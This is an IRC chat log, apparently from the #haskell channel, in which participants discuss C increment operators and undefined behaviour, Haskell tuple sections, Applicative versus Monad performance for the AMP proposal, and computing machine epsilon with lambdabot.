03:51:21 <DigitalKiwi> does that make math suck because i used it wrong?
03:53:45 <DT__> DigitalKiwi, you didn't, someone in the world mutated 3 to be 1+1.
03:54:19 <DigitalKiwi> effing fortran
03:55:03 <Kinnison> DT__: oooh multithreading too :-)
03:55:54 <DT__> hurray for shared state!
03:59:36 <mauke> x++ = { auto x2 = x; x = x + 1; x2 }
03:59:52 <mauke> ++x = { auto x2 = x; x = x + 1; x2 + 1 }
04:00:24 * hackagebot hist-pl-fusion 0.3.0 - Merging historical dictionary with PoliMorf  http://hackage.haskell.org/package/hist-pl-fusion-0.3.0 (JakubWaszczuk)
04:00:26 <mauke> unless you're doing perl, in which case ++x returns x itself
04:02:02 <pete_> well
04:02:06 <pete_> sort of
04:02:15 <Hafydd> ++x = { x++ + 1 }
04:02:15 <pete_> It returns the previous value of x
04:02:36 <Hafydd> x++ = { ++x - 1 }
04:02:44 <mauke> ++x never returns the previous value of x
04:02:54 <hpc> that distinction becomes significant for tied scalars
04:03:07 <pete_> mauke: Sure it does. Once the expression has been evaluated, x has a new value
04:03:09 <hpc> which are perl's hilarious form of operator overloading
04:03:18 <mauke> pete_: non sequitur
04:03:25 <elliott> pete_: you are thinking of x++
04:03:28 <mauke> hpc: no, operator overloading is perl's form of operator overloading
04:03:36 <mauke> tie is perl's form of variable overloading
04:03:36 <pete_> elliott: No, I'm thinking of ++x
04:03:51 <mauke> pete_: then you're wrong
04:03:53 <hiptobecubic> I thought x++ was implemented in terms of ++x
04:04:06 <mauke> hiptobecubic: in what context/language?
04:04:07 <elliott> pete_: if ++x returns the value of x before its mutation takes effect, then what does x++ return?
04:04:16 <hiptobecubic> mauke, c and c++
04:04:16 <elliott> the first is called "pre"increment (vs. "post"increment) for a reason
04:04:22 <pete_> elliott: the value afterwards
04:04:35 <elliott> pete_: okay, then the problem is simple: you have them backwards
04:04:36 <mauke> hiptobecubic: I don't think C defines x++ in terms of ++x
04:04:43 <elliott> x++ stores value of x (say y), increments x, returns y
04:04:46 <elliott> ++x increments x, returns x
04:04:48 <pete_> $x = 1; $y = ++$x; -- at this point, $y contains the previous value of $x
04:04:57 <pete_> which is 1, the current value being 2
04:05:02 <mauke> pete_: wrong
04:05:04 <Bor0> you got them in the wrong order petanqk
04:05:05 <Bor0> pete_ even
04:05:31 <Bor0> prefix (increase, then return), postfix (return, then increase)
04:05:34 <elliott> why are we arguing about this...? you can run that code and see that you're wrong in a matter of five seconds
04:06:16 <pete_> t's been a while since I've done perl
04:06:20 <DigitalKiwi> i died a little inside
04:06:41 <mauke> pete_: this isn't specific to perl
04:06:58 <pete_> It's been a while since I've done any programming that wasn't Haskell exercises
04:07:14 <mm_freak> Hafydd: in C both ++x and x++ are x
04:07:18 <DigitalKiwi> no matter who is right the fact that someone can be so confused about it is painful :<
04:07:24 <mauke> pete_: then why were you trying to correct me?
04:07:33 <pete_> mauke: Because I thought I was right?
04:07:48 <mm_freak> Hafydd: "++x + x" is the same as "(x += 1, x + x)"
04:08:00 <Hafydd> What?!
04:08:10 <mauke> mm_freak: in what language?
04:08:24 <mm_freak> both refer to the same variable and in that instance to the same value, just that that value has been incremented by one before the statement
04:08:27 <mm_freak> mauke: C
04:08:30 <mauke> mm_freak: wrong
04:08:32 <hpc> Hafydd: moral of the story, don't mix increments with larger expressions
04:08:42 <mm_freak> mauke: elaborate
04:08:44 <DigitalKiwi> what order are they evaluated?
04:08:48 <mauke> mm_freak: it's UB
04:08:52 <merijn> mm_freak: I think it's undefined/implementation specific
04:08:55 <Hafydd> By "x" I meant the value of the expression "x" had it been substituted for that code.
04:09:03 <Hafydd> Not the variable x.
04:09:12 <mm_freak> mauke: UB?
04:09:19 <mauke> mm_freak: undefined behavior
04:09:19 <DigitalKiwi> undefined behavior
04:09:39 <mm_freak> why is that undefined?  it's "pre-increment" for a reason
04:09:44 <mm_freak> this one is undefined:  ++x++
04:09:53 <mauke> code for which the definition of C imposes no requirements and for which a C compiler can therefore make demons fly out of your nose
04:09:54 <mm_freak> ++x++ x
04:09:56 <mm_freak> ++x++ + x
04:10:01 <mauke> mm_freak: no, that doesn't even compile
04:10:16 <hpc> ++x + x++ // undefined
04:10:25 * hackagebot Workflow 0.8.0.3 - Workflow patterns and a monad for thread state logging & recovery  http://hackage.haskell.org/package/Workflow-0.8.0.3 (AlbertoCorona)
04:10:29 <mm_freak> alright then
04:10:39 <mauke> mm_freak: it's a race condition
04:11:03 <mauke> C specifies no evaluation order, therefore you must assume that all subexpressions are evaluated concurrently
04:11:08 <mm_freak> mauke: so in what sense is "++x" "pre"-increment?
04:11:13 <Hafydd> Except at "sequence points".
04:11:22 <Bor0> wasn't there like right to left evaluation order in C?
04:11:29 <hpc> no
04:11:29 <mauke> mm_freak: in that the ++ is written before the variable
04:11:33 <mauke> hiptobecubic: yeah
04:11:35 <mauke> er
04:11:36 <mauke> Hafydd:
04:11:44 <mm_freak> Bor0: no, otherwise most optimizing compilers would be broken
04:11:48 <mauke> irssi, I am disappoint
04:11:49 <hpc> function application is a sequence point
04:11:53 <hpc> assignment is a sequence point
04:11:57 <mm_freak> mauke: that's it?
04:12:00 <mauke> hpc: no
04:12:00 <Araneidae> C defines "sequence points", and between each sequence point a variable must be modified at most once
04:12:12 <mauke> mm_freak: no, that's just something I made up. it's really all about sequence points
04:12:17 <Araneidae> Statements are separated by sequence points
04:12:34 <Araneidae> The comma operator (but not argument listing) is a sequence point
04:12:39 <Araneidae> not sure what else
04:12:43 <mauke> || && ?:
04:12:52 <Araneidae> Possibly, I'd have to check
04:12:55 <mauke> and function calls, as hpc mentioned (but not assignment)
04:12:56 <mm_freak> if function application is a sequence point, isn't "++x + x" actually well-defined because of the "+"?
04:12:59 <merijn> Araneidae: Function call, I think?
04:13:04 <mauke> mm_freak: + is not a function
04:13:07 <Araneidae> Yes, function call
04:13:25 <hpc> third(maybe_first(), maybe_also_first());
04:13:30 <DigitalKiwi> The moral is that writing code that depends on order of evaluation is a bad programming practice in any language.
04:13:34 <merijn> Araneidae: Pretty sure || && and ?: need to be sequence points to guarantee shortcircuiting
04:13:40 <Araneidae> Expect so
04:13:40 <mauke> mm_freak: even if it was (e.g. because it's an overloaded + and you're using C++), it'd be operator+(x++, x)
04:13:50 <mauke> mm_freak: i.e. the sequence point would come at the end, not in between
04:13:53 <DigitalKiwi> quote from K&R :P
04:13:56 <mm_freak> i see
04:14:09 <mm_freak> (x++, x + x)
04:14:09 <mauke> DigitalKiwi: K&R is wrong
04:14:12 <hpc> mauke: primitive types still use primitive plus
04:14:16 <DigitalKiwi> never!
04:14:19 <mauke> hpc: true
04:14:21 <Bor0> mauke: that's a first
04:14:21 <merijn> mm_freak: The more I learn C, the more I realise I have no f-ing clue about writing proper C :)
04:14:36 <mauke> DigitalKiwi: I always depend on the evaluation order of && and ||
04:14:50 <hpc> and semicolon is a sequence point
04:14:50 <Bor0> mauke: but C well defines those
04:15:00 <mm_freak> well, i have some clue about writing proper GCC-C =)
04:15:02 <hpc> semicolon is the preferred way of dealing with ambiguous orderings ;)
04:15:10 <mauke> Bor0: irrelevant
04:15:10 <merijn> I just assume all my C code is broken and just try to not rely on it to much :p
04:15:20 <Araneidae> mm_freak, I have now chopped my code into little pieces ...
04:15:22 <DigitalKiwi> i think they said there's an exception about those?
04:15:38 <DigitalKiwi> C, like most languages, does not specify the order in which the operands of an operator are
04:15:41 <DigitalKiwi> evaluated. (The exceptions are &&, ||, ?:, and `,'.) For example, in a statement like
04:15:57 <hpc> DigitalKiwi: comma?
04:16:00 <mm_freak> i remember watching a talk on D, where the speaker begins by showing why the "hello world" program in one of the famous C books is wrong =)
04:16:02 <monoidal> hpc: semicolon is not a good way to put it. it's end of an expression, for example if (...)
04:16:07 <mauke> <DigitalKiwi> The moral is that writing code that depends on order of evaluation is a bad programming practice in any language.
04:16:22 <DigitalKiwi> hpc: dunno
04:16:34 <mm_freak> Araneidae: feel free the paste (or git-push) it, but i can't guarantee any feedback =)
04:16:38 <Bor0> mauke: he obviously meant for order of evaluations that can have UB
04:16:45 <DigitalKiwi> yes
04:16:46 <hpc> i wonder if they mean third(first(), second())
04:16:52 <hpc> because i always thought that wasn't true
04:16:54 <Bor0> mauke: but || and && are well defined
04:16:59 <mauke> hpc: no, the comma operator
04:17:09 <mauke> hpc: in your code the comma is actually part of the function call operator
04:17:18 <Araneidae> mm_freak, that's ok.  It's a bit harder to paste up a bunch of files, and think I've got enough to chew on
04:17:36 <hpc> https://en.wikipedia.org/wiki/Comma_operator
04:17:39 <hpc> that's super weird
04:18:10 <mauke> "your face is super weird!"
04:18:33 <hpc> "omg this channel is so mean"
04:18:44 <DigitalKiwi> just turn to page 50
04:18:49 <mm_freak> Araneidae: that's the time when it makes more sense to put a repository somewhere
04:18:56 <mauke> the comma operator is spelled ';' in OCaml :-)
04:19:06 <mm_freak> so get started with darcs/git/mercurial
04:19:18 <hpc> the comma operator in haskell is spelled (>>)
04:19:31 <mauke> yeah, pretty much
04:19:37 <mm_freak> the comma operator in haskell is spelled ;
04:19:45 <mm_freak> let ‚Ä¶; ‚Ä¶; ‚Ä¶ in ‚Ä¶
04:19:48 <mauke> mm_freak: that's not an operator
04:20:04 <hpc> mm_freak: part of the comma operator is that it executes the first statement and discards the result
04:20:05 <mm_freak> i'm paraphrasing
04:20:28 <hpc> you might as well be saying (,) = const
04:20:37 <hpc> which it clearly doesn't
04:20:44 <mm_freak> then there are many kinds of comma operators in haskell
04:21:11 <mm_freak> (>>)
04:21:14 <mm_freak> fmap snd . first
04:21:32 <hpc> :t fmap snd . first
04:21:33 <lambdabot> (Functor (a1 (b1, b)), Arrow a1) => a1 b1 a -> a1 (b1, b) b
04:22:34 <mm_freak> liftA2 (const id)
04:33:34 <Ghoul_> > let parCurry = (,,) 1 2 in parCurry 3
04:33:36 <lambdabot>   (1,2,3)
04:33:41 <Ghoul_> blew my mind.
04:34:03 <hpaste> ‚ÄúDharmender Kumar‚Äù pasted ‚ÄúHR Manual Job In Delhi‚Äù at http://hpaste.org/87483
04:34:44 <donri> > (1,2,) 3
04:34:46 <lambdabot>   Illegal tuple section: use -XTupleSections
04:34:49 <donri> guess not
04:34:58 <Ghoul_> Is , being partially applied to each other
04:35:01 <Ghoul_> or is it just an operator
04:35:29 <fizbin> @pl \x -> (1,2,x)
04:35:29 <lambdabot> (,,) 1 2
04:35:35 <monoidal> Ghoul_: (,,) is an operator (any number of ,)
04:35:38 <mauke> (,,) is an "atom"
04:35:50 <monoidal> Ghoul_: (,,) :: a -> b -> c -> (a,b,c) and likewise for (,,,,,,)
04:35:50 <mauke> you can't explain it by looking at its parts
04:36:01 <fizbin> > (,,,) 1 2 3 4
04:36:03 <lambdabot>   (1,2,3,4)
04:36:23 <donri> it's syntax, not first class
04:36:59 <fizbin> > ((4,) 9)
04:37:01 <lambdabot>   Illegal tuple section: use -XTupleSections
04:39:07 <mm_freak> > (3,,4) 5
04:39:07 <mm_freak> (3,5,4)
04:39:09 <mm_freak> WOW!
04:39:10 <lambdabot>   Illegal tuple section: use -XTupleSections
04:39:21 <mm_freak> i didn't know that works
04:39:53 <mm_freak> > (1,,3,,5) 2 4
04:39:53 <mm_freak> (1,2,3,4,5)
04:39:55 <lambdabot>   Illegal tuple section: use -XTupleSections
04:39:56 <mm_freak> that's really useful
04:40:07 <donri> well with TupleSections, sure
04:40:24 <mm_freak> i only ever used tuple sections like this:  (x,) or (, x)
04:40:34 <mm_freak> :t (1 + + 3)
04:40:35 <lambdabot> parse error on input `+'
04:40:37 <mm_freak> too bad
04:40:56 <mm_freak> it should be possible to declare operators associative so that you can do this
04:44:07 <no-n> didn't know , was a n operator
04:44:13 <no-n> an*
04:44:50 <monoidal> no-n: it isn't. It has only special section-like syntax (,,,,,)
04:45:00 <no-n> ok
04:45:25 * hackagebot data-reify-cse 0.0.3 - Common Sub-Expression Elimination for graphs generated by Data.Reify.  http://hackage.haskell.org/package/data-reify-cse-0.0.3 (SebastiaanVisser)
04:45:34 <no-n> I hope Carmack makes wolf 3d open source
04:45:38 <no-n> it would be interesting to see
04:45:51 <elliott> it already is, no?
04:45:54 <elliott> or do you just mean the haskell version
04:45:57 <merijn> no-n: He wanted some Haskellers to look over it, so he probably weill
04:46:03 <no-n> yes
04:46:09 <hpaste> yzb3 pasted ‚Äúwords'‚Äù at http://hpaste.org/87484
04:46:23 <hpaste> yzb3 pasted ‚Äúwords'‚Äù at http://hpaste.org/87485
04:46:26 <zomg> Wait there's a haskell version of wolf3d?
04:46:28 <zomg> Cool =)
04:46:36 <no-n> zomg: well, not yet ;)
04:47:01 <merijn> zomg: Carmack tweeted yesterday that he wants to port wolf3d to haskell as experiment
04:47:24 <zomg> heh, interesting
04:47:28 <zomg> I wonder what prompted him to do that
04:47:42 <Botje> yzb3: it's customary to put the where at the start of the new line
04:47:48 <merijn> zomg: He's been getting more and more interested in functional programming (so has the entire games industry)
04:48:03 <Botje> probably people whining that he talks a lot about FP without actually doing it
04:48:13 <zomg> heh
04:48:15 <merijn> zomg: See amongst others: http://www.altdevblogaday.com/2012/04/26/functional-programming-in-c/
04:48:35 <monoidal> yzb3: instead of "snip = break isSpace str", "fst snip", "snd snp
04:48:53 <monoidal> yzb3: " it's better to use "(snip1, snip2) = break isSpace str", "snip1", "snip2"
04:48:56 <DrTeggy> So, next time you have an engaging boss fight, you'll be interrupted while stale closure are collected.
04:49:20 <Botje> DrTeggy: incremental GC is out there
04:49:49 <merijn> See also Tim Sweeney's (of Epic Games fame) POPL talk about functional programming and game dev
04:50:17 <no-n> what does he mean by "fringe language"?
04:50:40 <merijn> no-n: unpopular/not-widely used
04:50:48 <no-n> ah
04:50:50 <DrTeggy> Oh, Sweeney and SPJ share PPT templates. :-)
04:51:07 <no-n> well, it wouldn't be a fringe language if everyone used it :P
04:51:30 <hpaste> typoclass annotated ‚Äúwords'‚Äù with ‚Äúwords' (annotation)‚Äù at http://hpaste.org/87485#a87486
04:51:39 <merijn> For the interested: http://www.cs.princeton.edu/~dpw/popl/06/Tim-POPL.ppt
04:52:11 <typoclass> uh, yzb3 is already gone ...
04:52:56 <typoclass> Botje: i dunno. i do use trailing 'where' when i have only one line of code (see my annotation). is that unusual? i think i got it from kmc
04:53:24 <typoclass> ... i wouldn't line up the "="s of course. i find that confusing
04:53:32 <monoidal> typoclass: yzb3 did not appear here anyway.
04:54:20 <typoclass> monoidal: hm! i just saw people giving advice to yzb3 :-)
04:54:29 <monoidal> :)
04:59:21 <jaspervdj> Wrote a quick report about OdHac: http://jaspervdj.be/posts/2013-05-08-odhac.html
05:01:17 <typoclass> jaspervdj: oh thanks, nice
05:04:37 <quchen> So people have told me that Applicative often has better performance than Monad due to "static analysis". I'd like to expand this point to add it to the AMP (Applicative => Monad proposal). Is there anything specific I could quote or look at?
05:05:17 <quchen> What I'm trying to get to is that do blocks could be optimized to use Applicative functions when they can instead, leading to better optimization.
05:06:10 <donri> quchen: my understanding is if something can be a monad too, you can't get the static analysis with applicative
05:06:31 <donri> so the point is you can make some types applicative that can't be made monads
05:06:53 <elliott> well, you still get fewer things hidden behind functions
05:07:00 <elliott> I think there's been work done on hybrid applicative-monadic parsers
05:07:01 <alang> jaspervdj: who's this random ukranian guy?
05:07:06 <elliott> where you only pay the performance cost for using (>>=)
05:07:32 <typoclass> elliott: so it's a matter of monads carrying around unnecessary baggage?
05:07:42 <elliott> I don't know what you mean by that
05:08:53 <typoclass> elliott: when you say "fewer things hidden behind functions", does that mean the slowdown is caused by monads (for some reason) carrying around baggage that applicatives don't need to carry around?
05:09:02 <typoclass> i may have misread that
05:09:24 <donri> typoclass: say you want to track if a state computation "puts". with a plain monad, you'd have to evaluate the computation; with applicative you can track it statically with say a phantom type
05:09:38 <donri> (IIUC!)
05:09:51 <donri> maybe can do it with indexed monads too?
05:10:01 <typoclass> donri: hm! interesting
05:10:33 <quchen> donri: So if I understand your first answer correctly there's no performance benefit in using Applicative over Monad?
05:10:44 <quchen> That contradicts what I've heard here earlier
05:11:00 <donri> quchen: not sure that's the case; there might be other optimizations with applicative
05:11:51 <quchen> donri: I like to think about this in terms of List: "a <*> b" can make assumptions about the shape of the result quite easily. "a >>= f" can have much more complex behavior, based on how f behaves.
05:11:57 <elliott> quchen: you can get a speed up based on static information like "can it put"
05:12:50 <donri> elliott: but can you track that in an applicative that's also a monad?
05:13:13 <quchen> elliott: Oh, so because in an Applicative it either never puts or always puts, whereas in a Monad it's not a priori clear whether some previously bind-ed variable is put?
05:14:27 <elliott> right, something like that
05:14:30 <elliott> donri: you can partially
05:14:46 <elliott> donri: i.e., you can say either "yes puts" or "no puts" or "maybe puts"
05:14:56 <donri> heh
05:15:01 <elliott> and a subcomputation of "maybe puts" may still be "no puts"
05:18:53 <typoclass> so, is this it? to get the "statically ensured to not use 'put'" speedup, with monads, you'd have to write your own variant that is like State, but doesn't offer 'put'. with Applicatives, you don't need to write your own thing, the compiler (somehow) can track this automatically?
05:19:11 * typoclass on second thought doesn't understand much of anything
05:19:16 * typoclass purrs happily
05:20:26 * hackagebot hmemdb 0.3.0.0 - In-memory relational database  http://hackage.haskell.org/package/hmemdb-0.3.0.0 (MiguelMitrofanov)
05:20:30 <typoclass> quchen: do you have any benchmarks for this slowdown? they could show how much it is, and if it's worth it
05:20:30 <donri> typoclass: you need a special State applicative
05:20:35 <quchen> typoclass: Think of it this way: if your Applicative computation doesn't use put/get anywhere, you can simply ignore the state.
05:20:56 <quchen> In the monadic case, you can decide to get/put based on previous results.
05:21:17 <typoclass> donri: right ...
05:21:20 <quchen> Therefore, the state may or may not be modified, so you can't optimize it out that easily.
05:21:30 <acube> Do you have to track this with the type system? Isn't it enough to track it at runtime (you can still get the value puts/doesn't put faster if you have applicatives, as that value doesn't depend on the actual value)
05:21:56 <typoclass> quchen: ah! it begins to make more sense
05:23:25 <typoclass> quchen: so haskell might decide to not compute state which later isn't used anyway. with monads, that's not possible to know, and you need to compute the state just to be sure?
05:23:43 <donri> typoclass: it's not about what the compiler does
05:23:48 <donri> typoclass: it's about what you can express
05:24:30 <donri> typoclass: for example, you could make it a type error to never put
05:25:35 <absence> are there Reader, Writer, etc. applicatives in some library?
05:25:36 <typoclass> donri: hm ... but i can express that, can't i? "i use State here, but i never put anything, i might as well change it to Reader"
05:25:38 <quchen> donri: I don't think you need to go to type-level programming to see the benefits here though.
05:25:58 <donri> absence: transformers and mtl
05:26:17 <Chousuke> how would an Applicative instance for state work? :/
05:26:20 <typoclass> sorry. i'll shut up :-) i don't have any clue about this
05:26:42 <quchen> typoclass: Yes. The structure of an Applicative computation can only depend on exterior parameters. For Monadic ones, the shape/flow of your computation can depend on previous results.
05:27:50 <donri> > runState ((,) <$> get <* puts succ <*> get) 0
05:27:52 <lambdabot>   Not in scope: `puts'
05:27:52 <lambdabot>  Perhaps you meant `put' (imported from Control.Monad....
05:28:00 <typoclass> quchen: yes, sure. a monadic action produces a value that's passed on to the next guy. (a -> m b) -> (b -> m ...) ->
05:28:17 <donri> > runState ((,) <$> get <* Control.Monad.State.puts succ <*> get) 0
05:28:19 <lambdabot>   Not in scope: `Control.Monad.State.puts'
05:28:19 <lambdabot>  Perhaps you meant one of these:
05:28:19 <lambdabot>  ...
05:28:22 <donri> :(
05:28:28 <absence> donri: aren't they monads rather than applicatives?
05:28:33 <donri> absence: both
05:28:37 <quchen> > (`runState` 0) $ (+3) <$> get <* put 42 -- Chousuke
05:28:38 <lambdabot>   (3,42)
05:29:07 <merijn> absence: Every monad is an applicative, by definition
05:29:22 <typoclass> merijn: not in haskell!!1! =)
05:29:42 <quchen> Every Monad is an Applicative, by faith ;-(
05:29:44 <merijn> Isn't there WrappedMonad instance or something?
05:29:48 <absence> yes. perhaps i was unclear
05:30:03 <absence> i meant non-monad applicative-only :)
05:30:05 <eikke> Every Monad is an Applicative, but Haskell missed the memo.
05:30:24 <typoclass> quchen: by that theory, i (kinda) see how it's a slowdown. i think it's still a relevant question to look for benchmarks that express that, and that you could run on your modified ghc to see how much it matters in practice
05:30:25 <Chousuke> quchen: oh, right, you can still keep track of the state but you can't use it to influence the result of the computation.
05:30:37 <typoclass> (... using 'criterion' or whatnot)
05:31:13 <quchen> Chousuke: Right, you can't do things like "modify" for example.
05:32:47 <quchen> typoclass: It's at least in favour of the AMP in some way. :-)
05:33:02 <typoclass> quchen: still having a hard time, sorry. what good would it be to 'get' state in the "applicative State", if you can't use it to influence the remainder of the computation?
05:33:03 <absence> http://comonad.com/reader/2012/abstracting-with-applicatives/ <- this blog mentions Reader and Writer applicatives, as opposed to Reader and Writer monads unless i'm all confused. i was wondering if they're from a library or just "invented" in that article
05:33:24 <donri> absence: perhaps look at the arrows package
05:33:25 <typoclass> quchen: in other words, i can see how an applicative Writer makes sense, but ...
05:34:03 <Chousuke> typoclass: you can "get" the initial state and fmap your function over that, but you can't then put back the result of that.
05:35:11 <quchen> typoclass: In an Applicative setting, "get" gets the current state. However, you cannot make what's to the right depend of the "get" dependon what you've gotten.
05:35:42 <absence> donri: it only has arrow versions it seems
05:36:07 <typoclass> quchen: right, ok
05:36:09 <quchen> For example, you can't do "modify f = get >>= put . f" using an Applicative, because that threads the get-ed variable into something down the pipeline.
05:36:26 <donri> absence: no they're applicative as well
05:36:50 <quchen> typoclass: Basically, "get" in Applicative style gets whatever was last put to the left of its computation expression
05:37:04 <quchen> Eh, well that's the same as in the monadic case
05:37:07 <quchen> Silly me
05:37:13 <absence> donri: yes, but they require an Arrow instance :)
05:37:25 <absence> donri: class Arrow a => ArrowReader r a | a -> r
05:38:08 <acube> Reader and Writer are instances of Applicative by default, aren't they?
05:38:29 <typoclass> quchen: er yeah. i guess 'get' would always give the initial value set from the outside. it'll never give anything that was 'put' from inside the applicative
05:38:35 <quchen> acube: All standard Monads are also Applicatives.
05:40:44 <quchen> > (`runState` 0) $ put 1 *> get -- typoclass: nope :-)
05:40:46 <lambdabot>   (1,1)
05:41:35 <absence> acube: yes, but they're monads as well
05:41:35 <quchen> typoclass: What you could not do is something like "get, and if it's an even number put its square"
05:41:51 <typoclass> quchen: that means that example is a monad !!1!one!
05:42:14 <quchen> typoclass: You either always put or you never put, you can't decide how to continue your computation chain depending on previous values.
05:42:45 <absence> seems there is no "class Applicative a => ApplicativeReader r a" though
05:43:02 <acube> But for that get/put example, couldn't I just use a type like: data TrackedState a = TrackedState { modified :: Bool, runState :: a -> (s,a) } and laziness will ensure that when I only use (>>), I can get the value of modified without actually evaluating the computation
05:43:04 <mm_freak> interestingly you don't need a monad for this
05:43:18 <acube> absence: That's not needed for Applicatives
05:43:24 <jaspervdj> alang: Some guy who offered to take a picture of us two
05:43:31 <mm_freak> acube: that's not a monad
05:43:37 <jaspervdj> And didn't run away with our camera
05:43:44 <acube> mm_freak: Why not?
05:43:51 <mm_freak> acube: try to write (>>=) for it
05:44:02 <absence> acube: what do you mean needed?
05:44:45 <mm_freak> acube: http://ertes.de/new/tutorials/arrows.html#pd-motivating-example-static-information
05:44:45 <acube> mm_freak: It's isomorphic to type a = WriterT (Any Bool) (State s) a, isn't it
05:44:55 <acube> ?
05:45:01 <absence> acube: something that is an applicative but nothing more (i.e. not a monad or arrow) needs a type like that, doesn't it?
05:45:04 <mm_freak> acube: no
05:45:31 <mm_freak> acube: WriterT (Any Bool) (State s) a = s -> ((a, s), Any Bool)
05:45:44 <mm_freak> while your type is (Any Bool, s -> (a, s))
05:45:56 <acube> Oh, then maybe StateT s (Writer (Any Bool)) a ?
05:46:08 <mm_freak> same thing, just tuple organized differently
05:46:14 <acube> @unmtl StateT s (Writer (Any Bool))
05:46:14 <lambdabot> Plugin `unmtl' failed with: `StateT s (Writer (Any Bool))' is not applied to enough arguments, giving `/\A. s -> (A, s, Any Bool)'
05:46:19 <acube> @unmtl StateT s (Writer (Any Bool)) a
05:46:19 <lambdabot> s -> (a, s, Any Bool)
05:46:30 <acube> oh, didn't expect that
05:47:59 <typoclass> mm_freak: i need to read that article, it looks extremely interesting, thanks a lot
05:48:11 <mm_freak> you're welcome =)
05:49:33 <mm_freak> acube: the article i linked covers exactly that StateT+modified thing and why it's not a monad
05:49:38 <mm_freak> (and what it actually is)
05:58:09 <quchen> Is there any need for MonadZero being monadic?
05:58:24 <quchen> It's just Alternative but we don't have Applicative => Monad, right?
05:58:50 <acube> Alternative is just Monoid for Applicatives
05:59:00 <elliott> there is some controversy about an extra law and stuff.
05:59:05 <elliott> it's a mess. there's some haskellwiki pages about it
06:01:01 <quchen> elliott: I'm basically asking because I'm not sure whether to include Alternative => MonadZero in the AMp
06:01:50 <acube> What is MonadZero btw? I only know MonadPlus?
06:01:58 <elliott> my proposal is class (Monad m, Alternative m) => MonadPlus m where ... with default methods from Alternative and some note about it being historical
06:02:01 <quchen> acube: That's what I meant, sorry
06:02:08 <elliott> that way it isn't another breaking-tons-of-compat change later down the line.
06:02:35 <quchen> elliott: Right, we still need the Monad constraint right now.
06:02:47 <quchen> elliott: Assuming approval, I'll start patching Applicative instances in GHC soonish. Might as well add Alternative ones in one go.
06:05:32 <Mortchek> Is there a process for making significant changes like requiring Applicative for Monad?
06:06:19 <quchen> Mortchek: Yes. That one is especially tricky since it requires changing the Haskell standard.
06:06:50 <quchen> Mortchek: The idea is preparing lots of libraries in advance, or failing to try to do so. On success, propose the big change.
06:06:59 <absence> isn't there a haskell 2014 on the horizon? :)
06:07:09 <Mortchek> Sounds reasonable.
06:07:21 <quchen> absence:  The committee has just been formed, yes.
06:07:29 <Mortchek> So how do you prepare for that? By trying to make all Monad instances Applicative instances?
06:08:00 <quchen> Mortchek: Yes, that's the basic idea.
06:08:25 <quchen> Mortchek: The only real problem are libraries that define their own <*> etc.
06:08:39 <quchen> (Hoopl, part of GHC, does that. Grrrr)
06:09:00 <absence> quchen: is that where the Applicative => Monad thing will happen, or just ghc for starters?
06:09:59 <quchen> absence: I guess it will be somewhere in between. Only if Hackage doesn't break if the change is introduced in GHC it'll actually make it in the Report.
06:10:32 <quchen> I don't know about the order this will happen though (if it does at all).
06:10:58 <simukis_> Hmm, is there Double epsilon somewhere in the library?
06:11:06 <simukis_> s/library/base/
06:11:29 <copumpkin> epsilon?
06:11:57 <copumpkin> oh, the smallest positive double?
06:12:01 <simukis_> copumpkin: uhum.
06:12:02 <copumpkin> I don't think so
06:13:59 <quchen> > last . takeWhile (> 0) . iterate (/2) $ 1 -- simukis_: will that do as a hack?
06:14:00 <lambdabot>   5.0e-324
06:15:54 <MercurialAlchemi> today I learned: 5.0e-324/2 = 0.0
06:16:03 <MercurialAlchemi> the wonders of floating point representation
06:16:22 <fizbin> simukis_: The ieee package has methods defining things like minF, maxF, epsilon and delta for anything that's a RealFloat.
06:16:55 <MercurialAlchemi> (or how to solve Zeno's paradox with Haskell)
06:17:30 <fizbin> Also, quchen, that's not epsilon.
06:17:48 <fizbin> epsilon is the smallest value such that (1 + epsilon) != 1
06:18:22 <simukis_> I think I will use a less complex way of converting 0.* to rational instead of using approxRational with hacked up epsilon then.
06:18:47 <simukis_> still it's strange there's no such constant in haskell.
06:19:24 <fizbin> simukis_: As I said, the ieee package defines it for anything that's a RealFloat. (Double is one of the RealFloat values)
06:19:46 <fizbin> > floatDigits (undefined :: Double)
06:19:48 <lambdabot>   53
06:20:22 <fizbin> > encodeFloat 1 (0 ‚àí 52)
06:20:22 <lambdabot>   mueval: recoverEncode: invalid argument (invalid character)
06:20:40 <fizbin> > encodeFloat 1 (0 - 52)
06:20:42 <lambdabot>   2.220446049250313e-16
06:20:51 <fizbin> That's double epsilon.
06:21:19 <ion> https://gist.github.com/ion1/1188115
06:21:21 <ion> The minimum and maximum positive, finite floats
06:22:59 <fizbin> > let findEps :: RealFloat a => a -> a; findEps x = encodeFloat 1 (1 - (floatDigits x)) in findEps (undefined :: Double)
06:23:01 <lambdabot>   2.220446049250313e-16
06:23:16 <fizbin> > let findEps :: RealFloat a => a -> a; findEps x = encodeFloat 1 (1 - (floatDigits x)) in findEps (undefined :: Float)
06:23:17 <lambdabot>   1.1920929e-7
06:23:33 <quchen> fizbin: Woops, right. Nevermind then.
06:23:44 <fizbin> > let findEps :: RealFloat a => a -> a; findEps x = encodeFloat 1 (1 - (floatDigits x)) in (1.0 :: Float) + findEps (undefined :: Float)
06:23:46 <lambdabot>   1.0000001
06:24:09 <fizbin> > let findEps :: RealFloat a => a -> a; findEps x = encodeFloat 1 (1 - (floatDigits x)) in (1.0 :: Float) + (findEps (undefined :: Float) / 2)
06:24:12 <lambdabot>   1.0
06:24:35 <fizbin> > let findEps :: RealFloat a => a -> a; findEps x = encodeFloat 1 (1 - (floatDigits x)) in (1.0 :: Double) + (findEps undefined / 2)
06:24:37 <lambdabot>   1.0
06:24:46 <fizbin> > let findEps :: RealFloat a => a -> a; findEps x = encodeFloat 1 (1 - (floatDigits x)) in (1.0 :: Double) + (findEps undefined)
06:24:48 <lambdabot>   1.0000000000000002
06:25:06 <fizbin> > 1.0000000000000001 :: Double
06:25:08 <lambdabot>   1.0
06:26:03 <donri> https://en.wikipedia.org/wiki/Machine_epsilon#Approximation_using_Haskell
06:26:18 <donri> is that what you're looking for
06:26:37 <silasm> speaking of which, is there such thing as an arbitrary precision floating point type?
06:26:48 <fizbin> donri: Bet you it comes up with the same answer mine did.
06:26:52 <ccasin> Luke: did you have a question?
06:27:28 <fizbin> > last . map (subtract 1) . takeWhile (/= 1) . map (+ 1) . iterate (/2) $ (1 :: Float)
06:27:29 <lambdabot>   1.1920929e-7
06:27:49 <donri> > last . map (subtract 1) . takeWhile (/= 1) . map (+ 1) . iterate (/2) $ (1 :: Double)
06:27:52 <lambdabot>   2.220446049250313e-16
06:28:02 <kryft> Oh right, the first one was float
06:28:36 <fizbin> Which is in fact what "findEps" found.
